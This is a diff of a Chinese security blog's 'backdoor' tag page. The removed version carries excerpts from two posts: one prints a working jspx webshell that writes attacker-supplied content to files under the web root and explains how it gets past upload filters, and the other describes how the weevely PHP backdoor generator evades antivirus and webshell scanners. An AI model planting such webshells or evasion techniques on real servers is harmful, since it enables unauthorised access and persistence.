@@ -1,155 +1,226 @@
-<!DOCTYPE html>
-<html>
 
+  <!DOCTYPE HTML>
+<html  xmlns:wb="http://open.weibo.com/wb">
 <head>
-  <meta http-equiv="Content-Type" content="text/html" charset="UTF-8" >
-  <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"/>
-  <title>Tag: 后门 | Blog of Secer</title>
-  <meta name="description" content="" />
-  <meta name="HandheldFriendly" content="True" />
-  <meta name="MobileOptimized" content="320" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <link rel="stylesheet" type="text/css" href="/css/screen.css" />
-  <link rel="stylesheet" type="text/css" href="/css/style.css" />
-  <meta name="generator" content="Blog of Secer">
-
+  <meta charset="UTF-8">
   
-  
-  
-
-  
+    <title>Tag: 后门 | Blog of Secer</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=3, minimum-scale=1">
+    
+    <meta name="author" content="Secer">
+    
+    <meta name="description" content="记录互联网安全历程与个人成长经历">
+    
+    
+    
+    <meta name="twitter:card" content="summary" />
+    <meta name="twitter:site" content="333" />
+    <meta name="twitter:title" content="Tag: 后门 | Blog of Secer" />
+      
+    
+    
+    <link rel="alternate" href="atom.xml" title="Blog of Secer" type="application/atom+xml">
+    
+    
+    <link rel="icon" href="/img/favicon.ico">
+    
+    
+    <link rel="apple-touch-icon" href="/img/pacman.jpg">
+    <link rel="apple-touch-icon-precomposed" href="/img/pacman.jpg">
+    
+    <link rel="stylesheet" href="/css/style.css">
 </head>
 
-<!--
-<body class="home-template">
--->
-<body class="home-template">
-<div id="perspective" class="perspective effect-movedown">
-  <div class="container">
-    <!-- wrapper -->
-    <div class="wrapper">
+    <body>
+      <header>
+        <div>
+		
+			<div id="textlogo">
+				<h1 class="site-name"><a href="/" title="Blog of Secer">Blog of Secer</a></h1>
+				<h2 class="blog-motto"></h2>
+			</div>
+			<div class="navbar"><a class="navbutton navmobile" href="#" title="Menu">
+			</a></div>
+			<nav class="animated">
+				<ul>
+					<ul>
+					 
+						<li><a href="/">首页</a></li>
+					
+						<li><a href="/archives">文章</a></li>
+					
+						<li><a href="/about">关于</a></li>
+					
+						<li><a href="/atom.xml">RSS订阅</a></li>
+					
+					<li>
+					
+					<form class="search" action="/search/index.html" method="get" accept-charset="utf-8">
+						<label>Search</label>
+						<input type="text" id="search" name="q" autocomplete="off" maxlength="30" placeholder="Search" />
+					</form>
+					
+					</li>
+				</ul>
+			</nav>			
+</div>
 
-      <header class="site-head"  style="background: #24282b url(/img/img-bg.jpg) 0 -20%" >
-    <div class="vertical">
-        <div class="site-head-content inner">
-             <a class="blog-logo" href="/"><img src="/img/logo.svg" alt="Blog Logo"/></a> 
-            <h1 class="blog-title">Blog of Secer</h1>
-            <h2 class="blog-description"><button id="showMenu">Show Menu</button></h2>
-        </div>
-    </div>
-</header>
+      </header>
+      <div id="container">
+        
 
-      
-<main class="content" role="main">
+<div class="archive-title" >
+  <h2 class="tag-icon">后门</h2>
   
-  <article class="post">
-    <header class="post-header">
-      <span class="post-meta">
-      <time datetime="2013-10-21T21:09:36.000Z" itemprop="datePublished">
-          2013-10-22
-      </time>
-    
-    
-    | 
-    <a href='/tag/菜刀/'>菜刀</a>,
-    
-    <a href='/tag/后门/'>后门</a>
-    
-    
-</span>
-      <h2 class="post-title"><a href="/1043.seo/">攻击JavaWeb应用 8 -后门篇</a></h2>
-    </header>
-    <section class="post-excerpt">
-      <p>
-      
-        <h4><a href="http://drops.wooyun.org/tips/662">攻击JavaWeb应用[8]-后门篇</a></h4>  <h4>0x00 背景</h4>  <hr align="left" width="100%" noshade="noshade" size="2" />  <p>关于JavaWeb <a href="http://Ha.Cker.In/tag/后门" target="_blank">后门</a> 问题一直以来都比较少，而比较新奇的后门更少。在这里我分享几种比较有意思的JavaWeb后门给大家玩。</p>  <h4>0x01 jspx <a href="http://Ha.Cker.In/tag/后门" target="_blank">后门</a>&#160;</h4>  <hr align="left" width="100%" noshade="noshade" size="2" />  <p>在如今的web应用当中如果想直接传个jsp已经变得比较难了，但是如果只限制了asp、php、jsp、aspx等这些常见的后缀应该怎样去突破呢？我在读tomcat的配置文件的时候看到jsp和jspx都是由org.apache.jasper.servlet.JspServlet处理，于是想构建一个jspx的webshell。经过反复的折腾，一个jspx的后门就粗线了。测试应该是java的所有的server都默认支持。</p>  <h5>Tomcat默认的conf/web.xml下的配置：</h5>  <pre><code>&#160;&#160; &lt;servlet&gt;</code></pre><br><br><pre><code>&#160;&#160;&#160;&#160;&#160;&#160;&#160; &lt;servlet-name&gt;jsp&lt;/servlet-name&gt;</code></pre><br><br><pre><code>&#160;&#160;&#160;&#160;&#160;&#160;&#160; &lt;servlet-class&gt;org.apache.jasper.servlet.JspServlet&lt;/servlet-class&gt;</code></pre><br><br><pre><code>&#160;&#160;&#160;&#160;&#160;&#160;&#160; &lt;init-param&gt;</code></pre><br><br><pre><code>&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; &lt;param-name&gt;fork&lt;/param-name&gt;</code></pre><br><br><pre><code>&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; &lt;param-value&gt;false&lt;/param-value&gt;</code></pre><br><br><pre><code>&#160;&#160;&#160;&#160;&#160;&#160;&#160; &lt;/init-param&gt;</code></pre><br><br><pre><code>&#160;&#160;&#160;&#160;&#160;&#160;&#160; &lt;init-param&gt;</code></pre><br><br><pre><code>&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; &lt;param-name&gt;xpoweredBy&lt;/param-name&gt;</code></pre><br><br><pre><code>&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; &lt;param-value&gt;false&lt;/param-value&gt;</code></pre><br><br><pre><code>&#160;&#160;&#160;&#160;&#160;&#160;&#160; &lt;/init-param&gt;</code></pre><br><br><pre><code>&#160;&#160;&#160;&#160;&#160;&#160;&#160; &lt;load-on-startup&gt;3&lt;/load-on-startup&gt;</code></pre><br><br><pre><code>&#160;&#160;&#160; &lt;/servlet&gt;</code></pre><br><br><pre><code>&#160;</code></pre><br><br><pre><code>&#160;&#160;&#160; &lt;servlet-mapping&gt;</code></pre><br><br><pre><code>&#160;&#160;&#160;&#160;&#160;&#160;&#160; &lt;servlet-name&gt;jsp&lt;/servlet-name&gt;</code></pre><br><br><pre><code>&#160;&#160;&#160;&#160;&#160;&#160;&#160; &lt;url-pattern&gt;<em>.jsp&lt;/url-pattern&gt;</code></pre><br><br><pre><code>&#160;&#160;&#160;&#160;&#160;&#160;&#160; &lt;url-pattern&gt;</em>.jspx&lt;/url-pattern&gt;</code></pre><br><br><pre><code>&#160;&#160;&#160; &lt;/servlet-mapping&gt;</code></pre><br><br><p>关于jspx的资料网上并不多，官网给的文档也不清楚，搞的模模糊糊的。怎么去玩jspx大家可以看下官网的demo，或者参考一些文章。</p><br><br><p><a href="http://jspx-bay.sourceforge.net/">http://jspx-bay.sourceforge.net</a></p><br><br><p>关于jspx文件的一些说明：</p><br><br><p><a href="http://blog.sina.com.cn/s/blog_4b6de6bb0100089s.html">http://blog.sina.com.cn/s/blog_4b6de6bb0100089s.html</a></p><br><br><p>重点在于把Jsp里面的一些标记转换成xml支持的格式，比如：</p><br><br><pre><code>&lt;%@ include .. %&gt;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; &lt;jsp:directive.include .. /&gt;</code></pre><br><br><pre><code> &lt;%@ page .. %&gt;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; &lt;jsp:directive.page .. /&gt;</code></pre><br><br><pre><code>&lt;%@ taglib .. %&gt;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; xmlns:prefix=&quot;tag library URL&quot;</code></pre><br><br><pre><code>&lt;%= ..%&gt;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; &lt;jsp:expression&gt; .. &lt;/jsp:expression&gt;</code></pre><br><br><pre><code>&lt;% ..%&gt;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; &lt;jsp:scriptlet&gt; .. &lt;/jsp:scriptlet&gt;</code></pre><br><br><p>知道&lt;% %&gt;可以用<code>&lt;jsp:scriptlet&gt;&lt;/jsp:scriptlet&gt;</code>标记表示那么做起来就很简单了，直接把标记换下是非常容易做的。所以写个简单的shell一个就很简单了，但是如果想知道具体有那些标签或者说跟jsp里面的有那些不同怎么办呢？下面我简单的做了下对比（前面是jsp的代码提示，后面是jspx）：</p><br><br><p><a href="http://img.cker.in/JavaWeb8_9E52/clip_image001.jpg"><img title="clip_image001" style="border-right: 0px; border-top: 0px; display: inline; border-left: 0px; border-bottom: 0px" height="353" alt="clip_image001" src="http://img.cker.in/JavaWeb8_9E52/clip_image001_thumb.jpg" width="392" border="0" /></a></p><br><br><p>照着提示翻译下得知表示jsp里面的&lt;%! %&gt;需要用：<code>&lt;jsp:declaration&gt;&lt;/jsp:declaration&gt;</code>标签去替换就行了。</p><br><br><h5>其他重要提醒：</h5><br><br><p>在jspx里面遵循xml语法所以直接在jsp:declaration或者jsp:scriptlet标签内写&quot;&lt;&gt;&quot;这样的符号是不行的，需要转意（不转意会报编译错误，猜了下只需要把&lt;&gt;转成<code>&amp;lt;&#160;&#160; &amp;gt;</code>就行了）。</p><br><br><h5>jspx后门的具体实现代码：</h5><br><br><pre><code>&#160;&#160;&#160; &lt;jsp:root xmlns:jsp=&quot;<a href="http://java.sun.com/JSP/Page&amp;quot">http://java.sun.com/JSP/Page&amp;quot</a>;</code></pre><br><br><pre><code>&#160;&#160;&#160; xmlns=&quot;<a href="http://www.w3.org/1999/xhtml&amp;quot">http://www.w3.org/1999/xhtml&amp;quot</a>;</code></pre><br><br><pre><code>&#160;&#160;&#160; xmlns:c=&quot;<a href="http://java.sun.com/jsp/jstl/core&amp;quot">http://java.sun.com/jsp/jstl/core&amp;quot</a>; version=&quot;1.2&quot;&gt;</code></pre><br><br><pre><code>&#160;&#160;&#160; &lt;jsp:directive.page contentType=&quot;text/html&quot; pageEncoding=&quot;UTF-8&quot; /&gt;</code></pre><br><br><pre><code>&#160;&#160;&#160; &lt;jsp:directive.page import=&quot;java.io.<em>&quot; /&gt;</code></pre><br><br><pre><code>&#160;&#160;&#160; &lt;jsp:scriptlet&gt;</code></pre><br><br><pre><code>&#160;&#160;&#160;&#160;&#160;&#160;&#160; RandomAccessFile rf = new RandomAccessFile(request.getRealPath(&quot;/&quot;)+request.getParameter(&quot;f&quot;), &quot;rw&quot;);</code></pre><br><br><pre><code>&#160;&#160;&#160;&#160;&#160;&#160;&#160; rf.write(request.getParameter(&quot;t&quot;).getBytes());</code></pre><br><br><pre><code>&#160;&#160;&#160;&#160;&#160;&#160;&#160; rf.close();</code></pre><br><br><pre><code>&#160;&#160;&#160; &lt;/jsp:scriptlet&gt;</code></pre><br><br><pre><code>&lt;/jsp:root&gt;</code></pre><br>
-      
-      </p>
-      
-      <p>
-          <a href="/1043.seo/" class="excerpt-link">Read More...</a>
-      </p>
-      
-    </section>
-  </article>
+</div>
+<div id="main" class="archive-part clearfix">
+  <div id="archive-page">
+
+  <section class="post" itemscope itemprop="blogPost">
   
-  <article class="post">
-    <header class="post-header">
-      <span class="post-meta">
-      <time datetime="2012-10-22T05:05:32.000Z" itemprop="datePublished">
-          2012-10-22
-      </time>
-    
-    
-    | 
-    <a href='/tag/后门/'>后门</a>,
-    
-    <a href='/tag/weevely/'>weevely</a>
-    
-    
-</span>
-      <h2 class="post-title"><a href="/897.seo/">PHP后门生成工具weevely分析</a></h2>
-    </header>
-    <section class="post-excerpt">
-      <p>
-      
-        <p><p>唐门三少@T00LS</p>  <p>最近闲的蛋疼，玩了下weevely这个工具，感觉还是蛮强大的，防查杀，连接也是加密的。感兴趣的朋友看正文吧。    <br /><b>0x01 </b><b>摘要</b>     <br />&#160;&#160;&#160;&#160;&#160; <a href="http://ha.cker.in/tag/weevely" target="_blank">weevely</a>是一款针对PHP的webshell的自由软件，可用于模拟一个类似于telnet的连接shell，weevely通常用于web程序的漏洞利用，隐藏<a href="http://ha.cker.in/tag/后门" target="_blank">后门</a>或者使用类似telnet的方式来代替web 页面式的管理，<a href="http://ha.cker.in/tag/weevely" target="_blank">weevely</a>生成的服务器端php代码是经过了base64编码的，所以可以骗过主流的杀毒软件和IDS，上传服务器端代码后通常可以通过weevely直接运行。     <br />&#160;&#160;&#160;&#160;&#160; weevely所生成的PHP后门所使用的方法是现在比较主流的base64加密结合字符串变形技术，后门中所使用的函数均是常用的字符串处理函数，被作为检查规则的eval，system等函数都不会直接出现在代码中，从而可以致使<a href="http://ha.cker.in/tag/后门" target="_blank">后门</a>文件绕过后门查找工具的检查。使用暗组的Web后门查杀工具进行扫描，结果显示该文件无任何威胁，如下图。     <br /><a href="http://img.cker.in/PHPweevely_127EF/clip_image001.png" target="_blank"><img style="border-right-width: 0px; display: inline; border-top-width: 0px; border-bottom-width: 0px; border-left-width: 0px" title="clip_image001" border="0" alt="clip_image001" src="http://img.cker.in/PHPweevely_127EF/clip_image001_thumb.png" width="561" height="618" /></a>     <br />在本篇文章中，将针对其所生成的PHP后门进行分析，浅析其绕过后门查杀工具的原理，以及其运行与客户端交互的执行过程。 </p><br>
-      
-      </p>
-      
-      <p>
-          <a href="/897.seo/" class="excerpt-link">Read More...</a>
-      </p>
-      
-    </section>
-  </article>
+    <a href="/1043.seo/" title="攻击JavaWeb应用 8 -后门篇" itemprop="url">
   
-  <nav class="pagination" role="pagination">
+    <h1 itemprop="name">攻击JavaWeb应用 8 -后门篇</h1>
     
-    <span class="page-number">Page 1 of 1</span>
+    <time datetime="2013-10-21T21:09:36.000Z" itemprop="datePublished">2013-10-22</time>
+  </a>
+</section>
+
+  <section class="post" itemscope itemprop="blogPost">
+  
+    <a href="/897.seo/" title="PHP后门生成工具weevely分析" itemprop="url">
+  
+    <h1 itemprop="name">PHP后门生成工具weevely分析</h1>
     
-  </nav>
-</main>
+    <time datetime="2012-10-22T05:05:32.000Z" itemprop="datePublished">2012-10-22</time>
+  </a>
+</section>
 
 
-      
-<footer class="site-footer">
-  
-  <div class="inner">
-     <section class="copyright">All content copyright <a href="/">Blog of Secer</a> &copy; 2014 &bull; All rights reserved.</section>
-     <section class="poweredby">Proudly published with <a class="icon-ghost" href="http://zespia.tw/hexo/">Hexo</a></section>
   </div>
+</div>
+
+      </div>
+      <footer><div id="footer" >
+	
+	
+	<section class="info">
+		<p> 没有礁石，就没有美丽的浪花；没有挫折，就没有壮丽的人生！ <br/>
+			再长的路，一步步也能走完，再短的路，不迈开双脚也无法到达，平凡的脚步也可以走完伟大的行程！</p>
+	</section>
+	 
+	<div class="social-font" class="clearfix">
+		
+		<a href="http://weibo.com/111" target="_blank" title="weibo"></a>
+		
+		
+		<a href="https://twitter.com/333" target="_blank" title="twitter"></a>
+		
+		
+		<a href="https://github.com/333" target="_blank" title="github"></a>
+		
+		
+	</div>
+		<p class="copyright">Powered by <a href="http://hexo.io" target="_blank" title="hexo">hexo</a> and Theme by <a href="https://github.com/A-limon/pacman" target="_blank" title="pacman">pacman</a> © 2016 
+		
+		<a href="http://ha.cker.in" target="_blank" title="Secer">Secer</a>
+		
+		</p>
+</div>
 </footer>
+      <script src="/js/jquery-2.1.0.min.js"></script>
+<script type="text/javascript">
+$(document).ready(function(){ 
+  $('.navbar').click(function(){
+    $('header nav').toggleClass('shownav');
+  });
+  var myWidth = 0;
+  function getSize(){
+    if( typeof( window.innerWidth ) == 'number' ) {
+      myWidth = window.innerWidth;
+    } else if( document.documentElement && document.documentElement.clientWidth) {
+      myWidth = document.documentElement.clientWidth;
+    };
+  };
+  var m = $('#main'),
+      a = $('#asidepart'),
+      c = $('.closeaside'),
+      o = $('.openaside');
+  $(window).resize(function(){
+    getSize(); 
+    if (myWidth >= 1024) {
+      $('header nav').removeClass('shownav');
+    }else
+    {
+      m.removeClass('moveMain');
+      a.css('display', 'block').removeClass('fadeOut');
+      o.css('display', 'none');
+        
+    }
+  });
+  c.click(function(){
+    a.addClass('fadeOut').css('display', 'none');
+    o.css('display', 'block').addClass('fadeIn');
+    m.addClass('moveMain');
+  });
+  o.click(function(){
+    o.css('display', 'none').removeClass('beforeFadeIn');
+    a.css('display', 'block').removeClass('fadeOut').addClass('fadeIn');      
+    m.removeClass('moveMain');
+  });
+  $(window).scroll(function(){
+    o.css("top",Math.max(80,260-$(this).scrollTop()));
+  });
+});
+</script>
 
-      <script src="//ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>
-
-<script type="text/javascript" src="/js/jquery.fitvids.js"></script>
-<script type="text/javascript" src="/js/index.js"></script>
-<script type="text/javascript" src="/js/menu.js"></script>
 
 
 
 
 
-  </div>
+
+
+
+
+<script type="text/javascript">
+var _bdhmProtocol = (("https:" == document.location.protocol) ? " https://" : " http://");
+document.write(unescape("%3Cscript src='" + _bdhmProtocol + "hm.baidu.com/h.js%3F77edef7e6931022edbd2322ec66456e1' type='text/javascript'%3E%3C/script%3E"));
+</script>
+
+<div id="totop" style="position:fixed;bottom:150px;right:50px;cursor: pointer;">
+	<a title="返回顶部"><img src="/img/scrollup.png"/></a>
 </div>
+<script type="text/javascript">
+	(function($) { 
+		// When to show the scroll link
+		// higher number = scroll link appears further down the page   
+		var upperLimit = 300;
+		
+		// Our scroll link element
+		var scrollElem = $('#totop');
+	   
+		// Scroll to top speed
+		var scrollSpeed = 800;
+	   
+		// Show and hide the scroll to top link based on scroll position   
+		scrollElem.hide();
+		$(window).scroll(function () {            
+			var scrollTop = $(document).scrollTop();       
+			if ( scrollTop > upperLimit ) {
+				$(scrollElem).stop().fadeTo(300, 1); // fade back in           
+			}else{       
+				$(scrollElem).stop().fadeTo(300, 0); // fade out
+			}
+		});
+		// Scroll to top animation on click
+		$(scrollElem).click(function(){
+			$('html, body').animate({scrollTop:0}, scrollSpeed); return false;
+		});
+	})(jQuery);
+</script>
 
-<nav  class="outer-nav top horizontal">
 
-          <a class="icon-home"  href="/"><span>Home</span></a>
+    </body>
+   </html>
 
-          <a class="icon-news"  href="/archives"><span>Archive</span></a>
-
-          <a class="icon-image"  href="/images"><span>Images</span></a>
-
-          <a class="icon-wiki"  href="/wiki/"><span>Wiki</span></a>
-
-          <a class="icon-Favorites"  href="/favorites"><span>Favorites</span></a>
-
-          <a class="icon-mail"  href="/about/"><span>Contact</span></a>
-
-</nav>
-
-</div>
-</body>
-</html>
